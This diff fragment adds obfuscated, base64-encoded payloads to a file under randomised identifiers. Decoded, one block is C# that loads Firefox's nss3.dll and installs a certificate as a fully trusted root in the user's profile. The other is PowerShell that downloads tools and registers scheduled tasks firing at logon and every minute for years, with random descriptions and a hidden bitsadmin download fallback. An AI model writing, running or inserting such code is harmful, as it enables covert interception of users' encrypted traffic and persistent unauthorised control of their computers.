+&quot;cGFkaW5qZWN0b3IuZGxsIikpIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgWHVYKGZpRGxsLkZ1bGxOYW1lKTsKICAgICAgICAg&quot;+
+&quot;ICAgfQogICAgICAgICAgICBxQWlTYnRvaW8gPSBYdVgoZGlJbnN0YWxsUGF0aC5GdWxsTmFtZSArICJcXG5zczMuZGxsIik7CiAg&quot;+
+&quot;ICAgICAgICAgIGlmIChxQWlTYnRvaW8uRXF1YWxzKEludFB0ci5aZXJvKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAg&quot;+
+&quot;U3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKCJGaXJlZm94IGluc3RhbGwgZGlyZWN0b3J5IG5vdCBmb3VuZCIpOwogICAgICAgICAg&quot;+
+&quot;ICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIERpcmVjdG9yeS5TZXRDdXJyZW50RGlyZWN0b3J5&quot;+
+&quot;KHNDdXJyZW50RGlyZWN0b3J5KTsKICAgICAgICAgICAgLy9Jbml0IGNlcnQKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJDZXJ0&quot;+
+&quot;LCAwLCBpcENlcnQsIGJDZXJ0Lkxlbmd0aCk7CiAgICAgICAgICAgIFNFQ0l0ZW0gQ2VydEl0ZW0gPSBuZXcgU0VDSXRlbSgpOwog&quot;+
+&quot;ICAgICAgICAgICBDZXJ0SXRlbS5pVHlwZSA9IDM7CiAgICAgICAgICAgIENlcnRJdGVtLmJEYXRhID0gaXBDZXJ0OwogICAgICAg&quot;+
+&quot;ICAgICBDZXJ0SXRlbS5pRGF0YUxlbiA9ICh1aW50KWJDZXJ0Lkxlbmd0aDsKICAgICAgICAgICAgU0VDSXRlbVtdIGFDZXJ0SXRl&quot;+
+&quot;bSA9IG5ldyBTRUNJdGVtWzFdOwogICAgICAgICAgICBhQ2VydEl0ZW1bMF0gPSBDZXJ0SXRlbTsKCiAgICAgICAgICAgIENlcnRU&quot;+
+&quot;cnVzdHMgQ2VydFRydXN0ID0gbmV3IENlcnRUcnVzdHMoKTsKICAgICAgICAgICAgQ2VydFRydXN0LmlTaXRlID0gMHgxMDsKICAg&quot;+
+&quot;ICAgICAgICAgQ2VydFRydXN0LmlFbWFpbCA9IDB4MTA7CiAgICAgICAgICAgIENlcnRUcnVzdC5pU29mdCA9IDB4MTA7CiAgICAg&quot;+
+&quot;ICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiSW5pdCBjZXJ0IE9LIik7CiAgICAgICAgICAgIC8vRW5kIGluaXQgY2Vy&quot;+
+&quot;dAogICAgICAgICAgICBpbnQgc3RhdHVzID0gU2JpZChzUHJvZmlsZSwgIiIsICIiLCBTRUNNT0RfREIsIE5TU19JTklUX09QVElN&quot;+
+&quot;SVpFU1BBQ0UpOwogICAgICAgICAgICBpZiAoc3RhdHVzICE9IE9HZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lz&quot;+
+&quot;dGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIk5TU19Jbml0UmVhZFdyaXRlIEVSUk9SLiBTdGF0dXM6IDB4ezA6&quot;+
+&quot;WH07TGFzdCBlcnJvcjogMHh7MDpYfSIsIHN0YXR1cywgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKSk7CiAgICAgICAgICAg&quot;+
+&quot;ICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgSW50UHRyIGJkID0gcUhsaHhQR1JlKCk7CiAgICAg&quot;+
+&quot;ICAgICAgIGlmIChiZCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUu&quot;+
+&quot;V3JpdGVMaW5lKCJDRVJUX0dldERlZmF1bHRDZXJ0REIgRmFpbGVkIik7CiAgICAgICAgICAgICAgICBSa3RFSUx1eVNIKCk7CiAg&quot;+
+&quot;ICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3lzdGVtLkNvbnNvbGUuV3JpdGVM&quot;+
+&quot;aW5lKCJDRVJUX0dldERlZmF1bHRDZXJ0REIgT0siKTsKICAgICAgICAgICAgSW50UHRyIENlcnRUb0ltcG9ydCA9IG5ldyBJbnRQ&quot;+
+&quot;dHIoKTsKICAgICAgICAgICAgSW50UHRyW10gYUNlcnRUb0ltcG9ydCA9IG5ldyBJbnRQdHJbMV07CiAgICAgICAgICAgIHN0YXR1&quot;+
+&quot;cyA9IHZRWUMoYmQsIDExLCAxLCByZWYgYUNlcnRJdGVtLCByZWYgQ2VydFRvSW1wb3J0LCAxLCAwLCBJbnRQdHIuWmVybyk7CiAg&quot;+
+&quot;ICAgICAgICAgIGlmIChzdGF0dXMgIT0gT0dlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTeXN0ZW0uQ29uc29sZS5X&quot;+
+&quot;cml0ZUxpbmUoU3RyaW5nLkZvcm1hdCgiQ0VSVF9JbXBvcnRDZXJ0cyBFUlJPUi4gU3RhdHVzOiAweHswOlh9O0xhc3QgZXJyb3I6&quot;+
+&quot;IDB4ezA6WH0iLCBzdGF0dXMsIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSkpOwogICAgICAgICAgICAgICAgUmt0RUlMdXlT&quot;+
+&quot;SCgpOwogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xl&quot;+
+&quot;LldyaXRlTGluZSgiQ0VSVF9JbXBvcnRDZXJ0cyBPSyIpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoQ2VydFRvSW1wb3J0LCBh&quot;+
+&quot;Q2VydFRvSW1wb3J0LCAwLCAxKTsKICAgICAgICAgICAgc3RhdHVzID0gS0luUXlqKGJkLCBhQ2VydFRvSW1wb3J0WzBdLCByZWYg&quot;+
+&quot;Q2VydFRydXN0KTsKICAgICAgICAgICAgaWYgKCBzdGF0dXMgIT0gT0dlKSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAg&quot;+
+&quot;U3lzdGVtLkNvbnNvbGUuV3JpdGVMaW5lKFN0cmluZy5Gb3JtYXQoIkNFUlRfQ2hhbmdlQ2VydFRydXN0IEVSUk9SLiBTdGF0dXM6&quot;+
+&quot;IDB4ezA6WH07TGFzdCBlcnJvcjogMHh7MDpYfSIsIHN0YXR1cywgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKSk7CiAgICAg&quot;+
+&quot;ICAgICAgICAgICBSa3RFSUx1eVNIKCk7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH07CiAgICAg&quot;+
+&quot;ICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQ0VSVF9DaGFuZ2VDZXJ0VHJ1c3QgT0siKTsKICAgICAgICAgICAgaG9S&quot;+
+&quot;S3VBbVZUKENlcnRUb0ltcG9ydCwgMSk7CiAgICAgICAgICAgIFN5c3RlbS5Db25zb2xlLldyaXRlTGluZSgiQWRkIGNlcnQgT0si&quot;+
+&quot;KTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbil7fQogICAgICAgIGZpbmFsbHkKICAgICAgICB7CiAgICAgICAg&quot;+
+&quot;ICAgIFJrdEVJTHV5U0goKTsKICAgICAgICB9CgkJcmV0dXJuIHRydWU7Cgl9Cglwcml2YXRlIFN0cmluZyBHZXRQcm9maWxlKCkK&quot;+
+&quot;ICAgIHsKICAgICAgICBTdHJpbmcgRkZQcm9maWxlID0gUGF0aC5Db21iaW5lKEVudmlyb25tZW50LkdldEVudmlyb25tZW50VmFy&quot;+
+&quot;aWFibGUoIkFQUERBVEEiKSwgQCJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXMiKTsKICAgICAgICBpZiAoRGlyZWN0b3J5LkV4aXN0&quot;+
+&quot;cyhGRlByb2ZpbGUpKQogICAgICAgIHsKICAgICAgICAgICAgaWYgKERpcmVjdG9yeS5HZXREaXJlY3RvcmllcyhGRlByb2ZpbGUs&quot;+
+&quot;ICIqLmRlZmF1bHQiKS5MZW5ndGggPiAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm4gRGlyZWN0b3J5Lkdl&quot;+
+&quot;dERpcmVjdG9yaWVzKEZGUHJvZmlsZSwgIiouZGVmYXVsdCIpWzBdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJl&quot;+
+&quot;dHVybiAiIjsKICAgIH0KCXB1YmxpYyBieXRlW10gR2V0Q2VydEFzQnl0ZUFycmF5KFN0cmluZyBzQ2VydCkKICAgIHsKICAgICAg&quot;+
+&quot;ICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc0NlcnQpOwogICAgICAg&quot;+
+&quot;IH0KICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKXt9CiAgICAgICAgcmV0dXJuIG51bGw7CiAgICB9Cglwcml2YXRlIERpcmVjdG9y&quot;+
+&quot;eUluZm8gR2V0SVAoKQogICAgewogICAgICAgIERpcmVjdG9yeUluZm8gZnAgPSBudWxsOwogICAgICAgIC8vIGdldCBmaXJlZm94&quot;+
+&quot;IHBhdGggZnJvbSByZWdpc3RyeQogICAgICAgIC8vIHdlJ2xsIHNlYXJjaCB0aGUgMzJiaXQgaW5zdGFsbCBsb2NhdGlvbgogICAg&quot;+
+&quot;ICAgIFJlZ2lzdHJ5S2V5IGxvY2FsTWFjaGluZTEgPSBSZWdpc3RyeS5Mb2NhbE1hY2hpbmUuT3BlblN1YktleShAIlNPRlRXQVJF&quot;+
+&quot;XE1vemlsbGFcTW96aWxsYSBGaXJlZm94IiwgZmFsc2UpOwogICAgICAgIC8vIGFuZCBsZXRzIHRyeSB0aGUgNjRiaXQgaW5zdGFs&quot;+
+&quot;bCBsb2NhdGlvbiBqdXN0IGluIGNhc2UKICAgICAgICBSZWdpc3RyeUtleSBsb2NhbE1hY2hpbmUyID0gUmVnaXN0cnkuTG9jYWxN&quot;+
+&quot;YWNoaW5lLk9wZW5TdWJLZXkoQCJTT0ZUV0FSRVxXb3c2NDMyTm9kZVxNb3ppbGxhXE1vemlsbGEgRmlyZWZveCIsIGZhbHNlKTsK&quot;+
+&quot;CiAgICAgICAgaWYgKGxvY2FsTWFjaGluZTEgIT0gbnVsbCkKICAgICAgICB7CiAgICAgICAgICAgIHRyeQogICAgICAgICAgICB7&quot;+
+&quot;CiAgICAgICAgICAgICAgICBzdHJpbmdbXSBpbnN0YWxsZWRWZXJzaW9ucyA9IGxvY2FsTWFjaGluZTEuR2V0U3ViS2V5TmFtZXMo&quot;+
+&quot;KTsKICAgICAgICAgICAgICAgIC8vIHdlJ2xsIHRha2UgdGhlIGZpcnN0IGluc3RhbGxlZCB2ZXJzaW9uLCBwZW9wbGUgbm9ybWFs&quot;+
+&quot;bHkgb25seSBoYXZlIG9uZQogICAgICAgICAgICAgICAgaWYgKGluc3RhbGxlZFZlcnNpb25zLkxlbmd0aCA9PSAwKQogICAgICAg&quot;+
+&quot;ICAgICAgICAgICAgIHRocm93IG5ldyBJbmRleE91dE9mUmFuZ2VFeGNlcHRpb24oIk5vIGluc3RhbGxzIG9mIGZpcmVmb3ggcmVj&quot;+
+&quot;b3JkZWQgaW4gaXRzIGtleS4iKTsKCiAgICAgICAgICAgICAgICBSZWdpc3RyeUtleSBtYWluSW5zdGFsbCA9IGxvY2FsTWFjaGlu&quot;+
+&quot;ZTEuT3BlblN1YktleShpbnN0YWxsZWRWZXJzaW9uc1swXSk7CgogICAgICAgICAgICAgICAgLy8gZ2V0IGluc3RhbGwgZGlyZWN0&quot;+
+&quot;b3J5CiAgICAgICAgICAgICAgICBzdHJpbmcgaW5zdGFsbFN0cmluZyA9IChzdHJpbmcpbWFpbkluc3RhbGwuT3BlblN1YktleSgi&quot;+
+&quot;TWFpbiIpLkdldFZhbHVlKCJJbnN0YWxsIERpcmVjdG9yeSIsIG51bGwpOwoKICAgICAgICAgICAgICAgIGlmIChpbnN0YWxsU3Ry&quot;+
+&quot;aW5nID09IG51bGwpCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IE51bGxSZWZlcmVuY2VFeGNlcHRpb24oIkluc3RhbGwg&quot;+
+&quot;c3RyaW5nIHdhcyBudWxsIik7CgogICAgICAgICAgICAgICAgZnAgPSBuZXcgRGlyZWN0b3J5SW5mbyhpbnN0YWxsU3RyaW5nKTsK&quot;+
+&quot;ICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKQogICAgICAgICAgICB7CiAgICAgICAgICAgIH0KICAg&quot;+
+&quot;ICAgICB9CiAgICAgICAgZWxzZSBpZiAobG9jYWxNYWNoaW5lMiAhPSBudWxsKQogICAgICAgIHsKICAgICAgICAgICAgdHJ5CiAg&quot;+
+&quot;ICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHN0cmluZ1tdIGluc3RhbGxlZFZlcnNpb25zID0gbG9jYWxNYWNoaW5lMi5HZXRT&quot;+
+&quot;dWJLZXlOYW1lcygpOwogICAgICAgICAgICAgICAgLy8gd2UnbGwgdGFrZSB0aGUgZmlyc3QgaW5zdGFsbGVkIHZlcnNpb24sIHBl&quot;+
+&quot;b3BsZSBub3JtYWxseSBvbmx5IGhhdmUgb25lCiAgICAgICAgICAgICAgICBpZiAoaW5zdGFsbGVkVmVyc2lvbnMuTGVuZ3RoID09&quot;+
+&quot;IDApCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IEluZGV4T3V0T2ZSYW5nZUV4Y2VwdGlvbigiTm8gaW5zdGFsbHMgb2Yg&quot;+
+&quot;ZmlyZWZveCByZWNvcmRlZCBpbiBpdHMga2V5LiIpOwoKICAgICAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG1haW5JbnN0YWxsID0g&quot;+
+&quot;bG9jYWxNYWNoaW5lMi5PcGVuU3ViS2V5KGluc3RhbGxlZFZlcnNpb25zWzBdKTsKCiAgICAgICAgICAgICAgICAvLyBnZXQgaW5z&quot;+
+&quot;dGFsbCBkaXJlY3RvcnkKICAgICAgICAgICAgICAgIHN0cmluZyBpbnN0YWxsU3RyaW5nID0gKHN0cmluZyltYWluSW5zdGFsbC5P&quot;+
+&quot;cGVuU3ViS2V5KCJNYWluIikuR2V0VmFsdWUoIkluc3RhbGwgRGlyZWN0b3J5IiwgbnVsbCk7CgogICAgICAgICAgICAgICAgaWYg&quot;+
+&quot;KGluc3RhbGxTdHJpbmcgPT0gbnVsbCkKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgTnVsbFJlZmVyZW5jZUV4Y2VwdGlv&quot;+
+&quot;bigiSW5zdGFsbCBzdHJpbmcgd2FzIG51bGwiKTsKICAgICAgICAgICAgICAgIGZwID0gbmV3IERpcmVjdG9yeUluZm8oaW5zdGFs&quot;+
+&quot;bFN0cmluZyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbikKICAgICAgICAgICAgewogICAgICAg&quot;+
+&quot;ICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiBmcDsKICAgIH0KfQoiQDsKW0VoZG1IR21MQnpNWEtsXTo6TW1NYVJ1d3Vo&quot;+
+&quot;QlJaQ1IoKS55SnVXeGRseXVOKCIlQ0VSVCUiKTsKfQpMR0N4d0JNSGFr&quot;,
+    Ghq: &quot;JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s9MTsKJFNIX1RZUEVfVEFTS19TQ0hFRFVMRVI9MjsKJHNjaGVkdWxlclR5cGU9JFNIX1RZUEVfU0NIRURVTEVEX1RBU0s7CmZ1bmN0aW9uIEZWUkNsc2dnTVJBWgp7CnBhcmFtKFtzdHJpbmddJHppcGZpbGUsIFtzdHJpbmdd&quot;+
+&quot;JGRlc3RpbmF0aW9uKTsKJDd6ID0gSm9pbi1QYXRoICRlbnY6QUxMVVNFUlNQUk9GSUxFICc3emEuZXhlJzsKaWYgKC1OT1QgKFRlc3QtUGF0aCAkN3opKXsKVHJ5CnsKKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cHM6&quot;+
+&quot;Ly9jaG9jb2xhdGV5Lm9yZy83emEuZXhlJywkN3opOwp9CkNhdGNoe30KfQppZiAoJChUcnkgeyBUZXN0LVBhdGggJDd6LnRyaW0oKSB9IENhdGNoIHsgJGZhbHNlIH0pKXsKU3RhcnQtUHJvY2VzcyAiJDd6IiAtQXJndW1lbnRMaXN0ICJ4IC1vYCIkZGVzdGluYXRp&quot;+
+&quot;b25gIiAteSBgIiR6aXBmaWxlYCIiIC1XYWl0IC1Ob05ld1dpbmRvdwp9CmVsc2V7CiRzaGVsbCA9IG5ldy1vYmplY3QgLWNvbSBzaGVsbC5hcHBsaWNhdGlvbjsKJHppcCA9ICRzaGVsbC5OYW1lU3BhY2UoJHppcGZpbGUpOwpmb3JlYWNoKCRpdGVtIGluICR6aXAu&quot;+
+&quot;aXRlbXMoKSkKewokc2hlbGwuTmFtZXNwYWNlKCRkZXN0aW5hdGlvbikuY29weWhlcmUoJGl0ZW0pOwp9Cn0KfQpmdW5jdGlvbiBCYXNlNjRUb0ZpbGUKewpwYXJhbShbc3RyaW5nXSRmaWxlLCBbc3RyaW5nXSRzdHJpbmcpOwokYnl0ZXM9W1N5c3RlbS5Db252ZXJ0&quot;+
+&quot;XTo6RnJvbUJhc2U2NFN0cmluZygkc3RyaW5nKTsKI3NldC1jb250ZW50IC1lbmNvZGluZyBieXRlICRmaWxlIC12YWx1ZSAkYnl0ZXM7CltJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkZmlsZSwgJGJ5dGVzKTsKfQpmdW5jdGlvbiBSYW5kb21TdHJpbmd7CiAgICBw&quot;+
+&quot;YXJhbShbaW50XSRtaW49NSwgW2ludF0kbWF4PTE1KTsKICAgIHJldHVybiAoLWpvaW4gKCg0OC4uNTcpKyg2NS4uOTApKyg5Ny4uMTIyKSB8IEdldC1SYW5kb20gLUNvdW50IChHZXQtUmFuZG9tIC1taW5pbXVtICRtaW4gLW1heGltdW0gJG1heCkgfCAlIHtbY2hh&quot;+
+&quot;cl0kX30pKTsKfQpmdW5jdGlvbiBJbml0U2NoZWR1bGxlcnsKICAgIHRyeXsKICAgICAgICBJbXBvcnQtTW9kdWxlIFNjaGVkdWxlZFRhc2tzIC1FcnJvckFjdGlvbiBTdG9wOwogICAgICAgIHJldHVybiAkU0hfVFlQRV9TQ0hFRFVMRURfVEFTSzsKICAgIH1jYXRj&quot;+
+&quot;aHsKICAgICAgICAkRmlsZT0kZW52OlRlbXArJ1wnKyhSYW5kb21TdHJpbmcpKycuemlwJzsKICAgICAgICAkRGVzdD0kZW52OlRlbXArJ1wnKyhSYW5kb21TdHJpbmcpOwogICAgICAgIHdoaWxlICghKGlHZ1JMY3lJSlFCenJBICdodHRwczovL2FwaS5udWdldC5v&quot;+
+&quot;cmcvcGFja2FnZXMvdGFza3NjaGVkdWxlci4yLjUuMjMubnVwa2cnICRGaWxlKSkge30KICAgICAgICBpZiAoKFRlc3QtUGF0aCAkRGVzdCkgLWVxIDEpe1JlbW92ZS1JdGVtIC1Gb3JjZSAtUmVjdXJzZSAkRGVzdDt9bWtkaXIgJERlc3QgfCBPdXQtTnVsbDsKICAg&quot;+
+&quot;ICAgICBGVlJDbHNnZ01SQVogJEZpbGUgJERlc3Q7CiAgICAgICAgUmVtb3ZlLUl0ZW0gLUZvcmNlICRGaWxlOwogICAgICAgICRUU0Fzc2VtYmx5PSREZXN0KydcbGliXG5ldDIwXE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLmRsbCc7CiAgICAgICAgJGxv&quot;+
+&quot;YWRMaWIgPSBbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkRmlsZSgkVFNBc3NlbWJseSk7CiAgICAgICAgcmV0dXJuICRTSF9UWVBFX1RBU0tfU0NIRURVTEVSOwogICAgfQp9CmZ1bmN0aW9uIHhybk9scmoKewpwYXJhbShbc3RyaW5nXSRuYW1lLCBb&quot;+
+&quot;c3RyaW5nXSRjbWQsIFtzdHJpbmddJHBhcmFtcz0nJyxbaW50XSRyZXN0YXJ0PTAsW2ludF0kZGVsYXk9MCxbc3RyaW5nXSRkaXI9JycpOwpzd2l0Y2ggKCRzY2hlZHVsZXJUeXBlKSB7CiAgICAkU0hfVFlQRV9TQ0hFRFVMRURfVEFTSyB7CiAgICAgICAgJEFjdGlv&quot;+
+&quot;biA9IE5ldy1TY2hlZHVsZWRUYXNrQWN0aW9uIC1FeGVjdXRlICRjbWQ7CiAgICAgICAgaWYoLU5vdCBbU3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkcGFyYW1zKSl7CiAgICAgICAgICAgICRBY3Rpb24uQXJndW1lbnRzPSRwYXJhbXM7CiAgICAgICAgfQogICAgICAg&quot;+
+&quot;IGlmKC1Ob3QgW1N0cmluZ106OklzTnVsbE9yRW1wdHkoJGRpcikpewogICAgICAgICAgICAkQWN0aW9uLldvcmtpbmdEaXJlY3Rvcnk9JGRpcjsKICAgICAgICB9CiAgICAgICAgJExvZ29uVHJpZ2dlciA9IE5ldy1TY2hlZHVsZWRUYXNrVHJpZ2dlciAtQXRMb2dP&quot;+
+&quot;bjsKICAgICAgICB0cnl7CiAgICAgICAgICAgICRMb2dvblRyaWdnZXIuVXNlcklkPSRlbnY6dXNlcm5hbWU7CiAgICAgICAgfWNhdGNoewogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLlVzZXI9JGVudjp1c2VybmFtZTsKICAgICAgICB9CiAgICAgICAgaWYoLU5v&quot;+
+&quot;dCAkZGVsYXkgLWVxIDApewogICAgICAgICAgICAkTG9nb25UcmlnZ2VyLkRlbGF5PU5ldy1UaW1lU3BhbiAtU2Vjb25kcyAkZGVsYXk7CiAgICAgICAgfQogICAgICAgIGlmKCRyZXN0YXJ0IC1lcSAxKXsKICAgICAgICAgICAgJFRpbWVUcmlnZ2VyID0gTmV3LVNj&quot;+
+&quot;aGVkdWxlZFRhc2tUcmlnZ2VyIC1PbmNlIC1BdCAxMmFtIC1SZXBldGl0aW9uSW50ZXJ2YWwgKFtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tTWludXRlcygxKSkgLVJlcGV0aXRpb25EdXJhdGlvbiAoW1N5c3RlbS5UaW1lU3Bhbl06OkZyb21EYXlzKDM2NSAqIDIwKSk7&quot;+
+&quot;CiAgICAgICAgfQogICAgICAgICRTZXR0aW5ncyA9IE5ldy1TY2hlZHVsZWRUYXNrU2V0dGluZ3NTZXQ7CiAgICAgICAgJFNldHRpbmdzLkRpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICRTZXR0aW5ncy5TdG9wSWZHb2luZ09uQmF0&quot;+
+&quot;dGVyaWVzID0gJEZhbHNlOwogICAgICAgIGlmKCRyZXN0YXJ0IC1lcSAxKXsKICAgICAgICAgICAgJFRhc2sgPSBSZWdpc3Rlci1TY2hlZHVsZWRUYXNrIC1BY3Rpb24gJEFjdGlvbiAtVHJpZ2dlciAkTG9nb25UcmlnZ2VyLCRUaW1lVHJpZ2dlciAtU2V0dGluZ3Mg&quot;+
+&quot;JFNldHRpbmdzIC1UYXNrTmFtZSAkbmFtZSAtRGVzY3JpcHRpb24gKFJhbmRvbVN0cmluZyk7CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICRUYXNrID0gUmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtQWN0aW9uICRBY3Rpb24gLVRyaWdnZXIgJExvZ29uVHJpZ2dl&quot;+
+&quot;ciAtU2V0dGluZ3MgJFNldHRpbmdzIC1UYXNrTmFtZSAkbmFtZSAtRGVzY3JpcHRpb24gKFJhbmRvbVN0cmluZyk7CiAgICAgICAgfQogICAgICAgIFN0YXJ0LVNjaGVkdWxlZFRhc2sgLUlucHV0T2JqZWN0ICRUYXNrOwogICAgfTsKICAgIERlZmF1bHQgewogICAg&quot;+
+&quot;ICAgICR0cz1OZXctT2JqZWN0IE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLlRhc2tTZXJ2aWNlOwogICAgICAgICR0ZD0kdHMuTmV3VGFzaygpOwogICAgICAgICR0ZC5SZWdpc3RyYXRpb25JbmZvLkRlc2NyaXB0aW9uID0gKFJhbmRvbVN0cmluZyk7CiAg&quot;+
+&quot;ICAgICAgJHRkLlNldHRpbmdzLkRpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICR0ZC5TZXR0aW5ncy5TdG9wSWZHb2luZ09uQmF0dGVyaWVzID0gJEZhbHNlOwogICAgICAgICR0ZC5TZXR0aW5ncy5NdWx0aXBsZUluc3RhbmNlcyA9&quot;+
+&quot;IFtNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5UYXNrSW5zdGFuY2VzUG9saWN5XTo6SWdub3JlTmV3OwogICAgICAgICRMb2dvblRyaWdnZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5XaW4zMi5UYXNrU2NoZWR1bGVyLkxvZ29uVHJpZ2dlcjsKICAgICAg&quot;+
+&quot;ICAkTG9nb25UcmlnZ2VyLlN0YXJ0Qm91bmRhcnk9W1N5c3RlbS5EYXRlVGltZV06Ok5vdzsKICAgICAgICAkTG9nb25UcmlnZ2VyLlVzZXJJZD0kZW52OnVzZXJuYW1lOwogICAgICAgICRMb2dvblRyaWdnZXIuRGVsYXk9W1N5c3RlbS5UaW1lU3Bhbl06OkZyb21T&quot;+
+&quot;ZWNvbmRzKCRkZWxheSk7CiAgICAgICAgJHRkLlRyaWdnZXJzLkFkZCgkTG9nb25UcmlnZ2VyKTsKICAgICAgICBpZigkcmVzdGFydCAtZXEgMSl7CiAgICAgICAgJFRpbWVUcmlnZ2VyID0gTmV3LU9iamVjdCBNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlci5U&quot;+
+&quot;aW1lVHJpZ2dlcjsKICAgICAgICAkVGltZVRyaWdnZXIuU3RhcnRCb3VuZGFyeT1bU3lzdGVtLkRhdGVUaW1lXTo6Tm93OwogICAgICAgICRUaW1lVHJpZ2dlci5SZXBldGl0aW9uLkludGVydmFsPVtTeXN0ZW0uVGltZVNwYW5dOjpGcm9tTWludXRlcygxKTsKICAg&quot;+
+&quot;ICAgICAkVGltZVRyaWdnZXIuUmVwZXRpdGlvbi5TdG9wQXREdXJhdGlvbkVuZD0kRmFsc2U7CiAgICAgICAgJHRkLlRyaWdnZXJzLkFkZCgkVGltZVRyaWdnZXIpOwogICAgICAgIH0KICAgICAgICAkdHNmPSJNaWNyb3NvZnQuV2luMzIuVGFza1NjaGVkdWxlciI7&quot;+
+&quot;CiAgICAgICAgJEV4ZWNBY3Rpb249TmV3LU9iamVjdCAiJHRzZi5FeGVjQWN0aW9uIigkY21kLCRwYXJhbXMsJGRpcik7CiAgICAgICAgJHRkLkFjdGlvbnMuQWRkKCRFeGVjQWN0aW9uKTsKICAgICAgICAkdGFzaz0kdHMuUm9vdEZvbGRlci5SZWdpc3RlclRhc2tE&quot;+
+&quot;ZWZpbml0aW9uKCRuYW1lLCAkdGQpOwogICAgICAgICR0YXNrLlJ1bigpOwogICAgfTsKfQp9CmZ1bmN0aW9uIGlHZ1JMY3lJSlFCenJBIHsKICAgIHBhcmFtKFtzdHJpbmddJEFFVExjbml0S25hTnFyLCBbc3RyaW5nXSRhRW50c0JNdHNheUIpOwogICAgJEVycm9y&quot;+
+&quot;QWN0aW9uUHJlZmVyZW5jZSA9ICJTdG9wIjsKICAgIFdyaXRlLUhvc3QgKCJEb3dubG9hZCB7MH0gdG8gezF9IiAtZiAoJEFFVExjbml0S25hTnFyLCAkYUVudHNCTXRzYXlCKSk7CiAgICB0cnkgewogICAgICAgIFN0YXJ0LUJpdHNUcmFuc2ZlciAtU291cmNlICRB&quot;+
+&quot;RVRMY25pdEtuYU5xciAtRGVzdGluYXRpb24gJGFFbnRzQk10c2F5QjsKICAgIH0KICAgIGNhdGNoIHsKICAgICAgICAjV3JpdGUtRXJyb3IgJF8gLUVycm9yQWN0aW9uIENvbnRpbnVlOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIChOZXctT2JqZWN0IFN5c3Rl&quot;+
+&quot;bS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJEFFVExjbml0S25hTnFyLCRhRW50c0JNdHNheUIpOwogICAgICAgIH0KICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICNXcml0ZS1FcnJvciAkXyAtRXJyb3JBY3Rpb24gQ29udGludWU7CiAgICAgICAgICAg&quot;+
+&quot;IFN0YXJ0LVByb2Nlc3MgImNtZC5leGUiIC1Bcmd1bWVudExpc3QgIi9iIC9jIGJpdHNhZG1pbiAvdHJhbnNmZXIgL2Rvd25sb2FkIC9wcmlvcml0eSBISUdIIGAiJEFFVExjbml0S25hTnFyYCIgYCIkYUVudHNCTXRzYXlCYCIiIC1XYWl0IC1XaW5kb3dTdHlsZSBI&quot;+
